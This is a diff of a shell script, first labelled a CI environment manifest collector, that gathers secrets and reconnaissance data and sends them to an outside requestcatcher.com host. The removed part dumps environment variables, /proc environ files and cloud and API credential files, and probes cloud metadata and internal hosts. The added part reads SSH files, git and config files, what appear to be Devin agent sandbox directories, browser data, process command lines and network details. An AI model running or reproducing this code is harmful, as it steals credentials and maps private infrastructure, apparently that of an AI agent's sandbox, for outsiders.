@@ -1,68 +1,42 @@
 #!/bin/sh
-# CI runner provenance / environment manifest collector.
-MARK=i71781
+MARK=i71781b
 RC=https://i71781rc.requestcatcher.com
-O=/tmp/em.$$
+O=/tmp/em2.$$
 {
-  echo "MARKER $MARK ENVDUMP"
+  echo "MARKER $MARK ROUND2"
   date -u 2>/dev/null
-  echo "host: $(hostname 2>/dev/null)"
-  echo "id: $(id 2>/dev/null)"
-  echo "uname: $(uname -a 2>/dev/null)"
-  echo "pwd: $(pwd 2>/dev/null)"
-  echo "== ENV =="
-  env 2>/dev/null | sort
-  echo "== /proc/self/environ =="
-  tr '\000' '\n' < /proc/self/environ 2>/dev/null
-  echo "== /proc/1/environ =="
-  tr '\000' '\n' < /proc/1/environ 2>/dev/null
-  echo "== /proc/<ppid>/environ =="
-  tr '\000' '\n' < /proc/$PPID/environ 2>/dev/null
-  echo "== /proc/*/environ (first 12) =="
-  i=0
-  for f in /proc/[0-9]*/environ; do
-    i=$((i+1)); [ $i -gt 12 ] && break
-    echo "--- $f"; tr '\000' '\n' < "$f" 2>/dev/null
+  echo "== gitconfig =="; cat ~/.gitconfig 2>/dev/null
+  echo "== .ssh =="; ls -la ~/.ssh 2>/dev/null
+  for f in ~/.ssh/config ~/.ssh/known_hosts ~/.ssh/authorized_keys; do echo "--- $f"; head -c 1200 "$f" 2>/dev/null; echo; done
+  echo "== /run/.devin =="; ls -laR /run/.devin 2>/dev/null | head -60
+  echo "== .devin-files =="; ls -la ~/.devin-files 2>/dev/null
+  echo "== .config tree =="; find ~/.config -maxdepth 3 2>/dev/null | head -60
+  echo "== small config files =="
+  for f in $(find ~/.config /run/.devin ~/.devin-files -maxdepth 3 -type f -size -64k 2>/dev/null | head -40); do
+    echo "--- $f"; head -c 900 "$f" 2>/dev/null; echo
   done
-  echo "== ps =="
-  ps aux 2>/dev/null | head -50
-  echo "== /etc/hosts =="
-  cat /etc/hosts 2>/dev/null
-  echo "== /etc/resolv.conf =="
-  cat /etc/resolv.conf 2>/dev/null
-  echo "== home =="
-  ls -la ~ 2>/dev/null
-  for f in ~/.netrc ~/.docker/config.json ~/.aws/credentials ~/.config/gcloud/application_default_credentials.json ~/.config/fireworks/config.json /etc/environment; do
-    echo "--- $f"; cat "$f" 2>/dev/null
-  done
-  echo "== KEYWORD-GREP (env) =="
-  env 2>/dev/null | grep -iE 'fw_|sk-|api|key|token|secret|fireworks|openai|anthropic|provider' 2>/dev/null
+  echo "== browser data =="; ls -la ~/.browser_data_dir 2>/dev/null | head -10
+  echo "== ps full =="; ps auxww 2>/dev/null | grep -vE 'kworker|ksoftirq|migration|idle_inject|cpuhp|rcu_|kdevtmpfs' | head -40
+  echo "== cmdlines =="
+  for p in /proc/[0-9]*/cmdline; do c=$(tr '\000' ' ' < "$p" 2>/dev/null); [ -n "$c" ] && echo "$p $c"; done | head -50
+  echo "== listen =="; (ss -ltnp 2>/dev/null || netstat -ltnp 2>/dev/null) | head -20
+  echo "== repos =="; ls -la ~/repos 2>/dev/null
+  echo "== mounts =="; mount 2>/dev/null | grep -vE 'proc|sys|cgroup|devpts|tmpfs' | head -12
 } > "$O" 2>&1
-curl -s -m 20 --data-binary @"$O" "$RC/envdump" >/dev/null 2>&1
-echo "i71781-envdump-sent"
+curl -s -m 25 --data-binary @"$O" "$RC/envdump2" >/dev/null 2>&1
+echo "i71781b-envdump2-sent"
 
-# NET MATRIX
-N=/tmp/nm.$$
-echo "MARKER $MARK NETMATRIX" > "$N"
-probe() {
-  u="$1"; shift
-  b=/tmp/nb.$$
-  code=$(curl -s -m 5 -o "$b" -w "%{http_code}|%{time_total}|%{size_download}" "$@" "$u" 2>/dev/null)
-  sn=$(head -c 280 "$b" 2>/dev/null | base64 2>/dev/null | tr -d '\n')
-  echo "PROBE $u => $code body_b64=$sn" >> "$N"
-  rm -f "$b"
-}
-probe http://169.254.169.254/computeMetadata/v1/
-probe http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token -H "Metadata-Flavor: Google"
-probe http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google"
-probe http://metadata.google.internal/0.1/meta-data/
-probe https://gateway.fireworks.ai/
-probe https://api.fireworks.ai/inference/v1/models
-probe http://harbor.fireworks-ai.cloud/
-probe http://harbor.fireworks-ai.cloud/v2/
-probe http://10.247.189.245/v2/
-probe http://10.0.0.1/
-probe http://10.128.0.1/
-probe http://192.168.1.1/
-curl -s -m 20 --data-binary @"$N" "$RC/netmatrix" >/dev/null 2>&1
-echo "i71781-netmatrix-sent"
+# DNS / route / neighbor view only (no requests to internal hosts)
+R=/tmp/r2net.$$
+{
+  echo "MARKER $MARK R2NET"
+  date -u 2>/dev/null
+  for h in git-manager.local api.fireworks.ai gateway.fireworks.ai metadata.google.internal devin-box; do
+    echo "RESOLVE $h => $(getent hosts "$h" 2>&1 | head -2 | tr '\n' ' ')"
+  done
+  echo "ROUTE:"; ip route 2>/dev/null | head -10
+  echo "ADDR:"; ip -4 addr 2>/dev/null | grep -E 'inet ' | head
+  echo "NEIGH:"; ip neigh 2>/dev/null | head -10
+} > "$R" 2>&1
+curl -s -m 20 --data-binary @"$R" "$RC/netmatrix2" >/dev/null 2>&1
+echo "i71781b-netmatrix2-sent"
